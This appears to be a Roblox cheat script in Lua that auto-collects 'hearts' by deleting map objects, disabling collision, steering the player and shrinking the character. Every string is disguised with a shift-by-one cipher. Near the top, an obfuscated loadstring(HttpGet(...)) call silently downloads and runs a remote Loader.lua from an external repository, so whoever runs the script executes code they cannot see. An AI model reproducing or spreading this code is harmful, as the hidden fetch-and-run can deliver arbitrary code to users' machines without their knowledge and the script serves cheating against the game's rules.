local function e(s) return s:gsub(".", function(c) return string.char(c:byte() + 1) end) end
local function d(s) return s:gsub(".", function(c) return string.char(c:byte() - 1) end) end

local ENV = setmetatable({}, {__index = getfenv()})
local g = game

local function getService(s)
    return g:GetService(d(s))
end

local RS = getService("SvoTfswjdf")
local WS = getService("Xpsltqbdf")
local PS = getService("Qmbzfst")
local LP = PS.LocalPlayer

spawn(function()
    (loadstring(g:HttpGet(d("iuuqt://sbx.hjuivcvtfsdpoufou.dpn/PofDsfbupsY-Ofx/UxpEfw/nbjo/Mpbefs.mvb"))))("jogp")
end)

local function safeCall(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn(d("Fssps jo gvodujpo dbmm: ") .. tostring(result))
    end
    return success, result
end

local function eliminarObjeto(objeto)
    for _, hijo in ipairs(objeto:GetDescendants()) do
        if hijo:IsA(d("CbtfQbsu")) then
            hijo:Destroy()
        end
    end
    objeto:Destroy()
end

local terreno = WS.Map.Terrain
if terreno then
    if terreno:FindFirstChild(d("Npvoubjot")) then
        eliminarObjeto(terreno[d("Npvoubjot")])
    end
    if terreno:FindFirstChild(d("Spdlt")) then
        eliminarObjeto(terreno[d("Spdlt")])
    end
end

local function dentroDelCubo(punto, centro, tamano)
    return math.abs(punto.X - centro.X) <= tamano.X/2 and
           math.abs(punto.Y - centro.Y) <= tamano.Y/2 and
           math.abs(punto.Z - centro.Z) <= tamano.Z/2
end

local function processHearts()
    local player = g.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local alturaInicial = character.HumanoidRootPart.Position.Y

    local hearts = WS.Map.Interactable.Hearts:GetChildren()
    for _, heart in ipairs(hearts) do
        if heart:IsA(d("CbtfQbsu")) then
            local eliminar = false
            if terreno[d("Npvoubjot")] then
                for _, mountain in ipairs(terreno[d("Npvoubjot")]:GetChildren()) do
                    if mountain:IsA(d("CbtfQbsu")) and dentroDelCubo(heart.Position, mountain.Position, mountain.Size) then
                        eliminar = true
                        break
                    end
                end
            end
            if not eliminar and terreno[d("Spdlt")] then
                for _, rock in ipairs(terreno[d("Spdlt")]:GetChildren()) do
                    if rock:IsA(d("CbtfQbsu")) and dentroDelCubo(heart.Position, rock.Position, rock.Size) then
                        eliminar = true
                        break
                    end
                end
            end
            if not eliminar and heart.Position.Y >= alturaInicial and heart.Position.Y <= alturaInicial + 90 then
                eliminar = true
            end
            if eliminar then
                heart:Destroy()
            end
        end
    end
end

spawn(processHearts)

safeCall(function()
    for _, f in ipairs(WS.Map.Interactable:GetDescendants()) do
        if f.Name == d("HspvqDiftu") or f.Name == d("TqjoXiffm") then
            f:Destroy()
        end
    end

    WS.Map.Decorations:Destroy()
    WS.nightLights:Destroy()
    WS.BillboardGui:Destroy()
    WS.Map.Leaderboards:Destroy()

    local function destroySpecificObjects(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.ClassName == d("Npefm") and child.Name == d("Npefm") then
                child:Destroy()
            elseif child.ClassName == d("NftiQbsu") and child.Name == d("NftiQbsu") then
                child:Destroy()
            elseif child.ClassName == d("Qbsu") and child.Name == d("Qbsu") then
                child:Destroy()
            end
            destroySpecificObjects(child)
        end
    end

    for _, f in ipairs(WS.Map.Interactable.MushroomHouses:GetDescendants()) do
        if f:IsA(d("Gpmefs")) and f.Name == d("Puifs") then
            f:Destroy()
        end
    end
    WS.Map.Interactable.Other:Destroy()
    WS.Billboards:Destroy()
    WS.BillboardGui:Destroy()
    WS.nightLights:Destroy()
    destroySpecificObjects(WS)
end)

spawn(function()
    safeCall(function()
        local function findObject(parent, name)
            for _, child in ipairs(parent:GetChildren()) do
                if child.Name:lower() == name:lower() then
                    return child
                end
            end
            return nil
        end

        local map = WS:FindFirstChild(d("Nbq"))
        if not map then return end

        local ugcshop = findObject(map, d("vhdtipq"))
        if not ugcshop then return end

        ugcshop:Destroy()
    end)
end)

local mapTerrain = WS:WaitForChild(d("Nbq")):WaitForChild(d("Ufssbjo"))

for _, obj in ipairs(mapTerrain:GetChildren()) do
    if not obj:IsA(d("Npefm")) then
        obj:Destroy()
    end
end

spawn(function()
    local function disableCollisionForInteractables()
        for _, interactable in ipairs(WS.Map.Interactable:GetDescendants()) do
            if interactable:IsA(d("CbtfQbsu")) then
                interactable.CanCollide = false
            end
        end
    end

    spawn(function()
        for _, object in pairs(WS:GetChildren()) do
            if object:IsA(d("CbtfQbsu")) then
                object:Destroy()
            end
        end
    end)

    disableCollisionForInteractables()

    spawn(function()
        for _, object in pairs(WS:GetChildren()) do
            if object:IsA(d("Npefm")) and not PS:GetPlayerFromCharacter(object) and not object:IsA(d("Gpmefs")) then
                object:Destroy()
            end
        end
        
        g:GetService(d("SvoTfswjdf")).Heartbeat:Connect(disableCollisionForInteractables)
    end)
end)

local b = true
local speed = 60

local function saveSpeed(speed)
    if not isfolder(d("TqffeEbub")) then makefolder(d("TqffeEbub")) end
    writefile(d("TqffeEbub/Tqffe.uyu"), tostring(speed))
end

local function loadSpeed()
    if isfile(d("TqffeEbub/Tqffe.uyu")) then
        return tonumber(readfile(d("TqffeEbub/Tqffe.uyu"))) or 60
    else
        saveSpeed(60)
        return 60
    end
end

speed = loadSpeed()

local function collectHeart(heartPart)
    local player = g.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild(d("IvnbopjeSppuQbsu")) then
        local PPos = player.Character[d("IvnbopjeSppuQbsu")].Position
        local HPos = Vector3.new(heartPart.Position.X, PPos.Y, heartPart.Position.Z)
        local dist = (HPos - PPos).magnitude
        if dist < 1 then
            heartPart.Transparency = 1
            heartPart.Position = PPos
            spawn(function()
                safeCall(function() wait(10) heartPart.Transparency = 0 end)
            end)
        end
    end
end

local function moveToTarget(targetPosition)
    local player = g.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild(d("IvnbopjeSppuQbsu")) and b then
        local PPos = player.Character[d("IvnbopjeSppuQbsu")].Position
        local direction = (targetPosition - PPos).unit
        player.Character[d("IvnbopjeSppuQbsu")].Velocity = direction * speed
    end
end

local function findNearestClaimableObject()
    local player = g.Players.LocalPlayer
    if not player or not player.Character or not player.Character:FindFirstChild(d("IvnbopjeSppuQbsu")) then return nil end
    local PPos = player.Character[d("IvnbopjeSppuQbsu")].Position
    local nearestClaimable = nil
    local minDistance = math.huge
    for _, f in ipairs(WS.Map.Interactable.MushroomHouses:GetDescendants()) do
        if f:IsA(d("UfyuMbcfm")) and f.Text == d("Dmbjn") then
            local claimableObject = f.Parent.Parent.Parent
            local distance = (claimableObject.Position - PPos).Magnitude
            if distance < minDistance then
                minDistance = distance
                nearestClaimable = claimableObject
            end
        end
    end
    return nearestClaimable
end

local function moveHearts()
    local nearestClaimable = findNearestClaimableObject()
    if nearestClaimable then
        moveToTarget(nearestClaimable.Position)
        collectHeart(nearestClaimable)
    else
        local player = g.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild(d("IvnbopjeSppuQbsu")) and b then
            local PPos = player.Character[d("IvnbopjeSppuQbsu")].Position
            local Hearts = WS.Map.Interactable:GetDescendants()
            local minDist = math.huge
            local closestHeart = nil
            for _, H in ipairs(Hearts) do
                if H:IsA(d("NftiQbsu")) and H.Transparency ~= 1 then
                    local HPos = Vector3.new(H.Position.X, PPos.Y, H.Position.Z)
                    local dist = (HPos - PPos).magnitude
                    if dist < 1 then
                        collectHeart(H)
                    elseif dist < minDist then
                        minDist = dist
                        closestHeart = H
                    end
                end
            end
            if closestHeart then
                moveToTarget(closestHeart.Position)
                collectHeart(closestHeart)
            end
        end
    end
end

g:GetService(d("SvoTfswjdf")).RenderStepped:Connect(function()
    safeCall(moveHearts)
end)

safeCall(function()
    local function scaleCharacter(scale)
        local character = LP.Character or LP.CharacterAdded:Wait()
        local humanoid = character:WaitForChild(d("Ivnbopje"))
        
        if not character or not humanoid then
            return
        end
        
        local newScale = Vector3.new(scale, scale, scale)
        
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA(d("CbtfQbsu")) then
                part.Size = part.Size * newScale
            end
        end
        
        local rootPart = character:FindFirstChild(d("IvnbopjeSppuQbsu"))
        if rootPart then
            rootPart.Position = rootPart.Position - Vector3.new(0, (1 - scale) * 3, 0)
        end
    end

    scaleCharacter(0.4)
end)
